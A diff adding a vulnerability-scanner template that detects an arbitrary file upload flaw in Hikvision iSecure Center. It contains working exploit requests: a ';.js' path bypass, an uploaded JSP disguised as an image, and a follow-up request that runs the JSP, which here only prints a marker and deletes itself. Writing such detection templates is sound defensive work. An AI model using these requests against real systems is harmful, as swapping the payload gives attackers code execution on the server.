@@ -1,0 +1,46 @@
+id: hikvision-isecure-center-fileupload
+info:
+  name: 海康威视 iSecure Center - 任意文件上传漏洞
+  author: secking
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1396215
+    vendor: hikvision
+    product: isecure-center
+  tags: file-upload,vuln,hikvision
+variables:
+  r0: '{{to_lower(rand_text_alpha(8))}}'
+  r1: '{{to_lower(rand_text_alpha(20))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/clusterMgr/clusters/ssl/file;.js'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+    body: |
+      ----------------------------984514492333278399715408
+      Content-Disposition: form-data; name="file"; filename="languages/{{r0}}.jsp"
+      Content-Type: image/png
+
+      <%out.print("{{r1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ----------------------------984514492333278399715408
+      Content-Disposition: form-data; name="proxyAddress"
+
+      8.8.8.8
+      ----------------------------984514492333278399715408--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "上传文件为空")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/clusterMgr/languages/{{r0}}.jsp;.js'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, r1)'
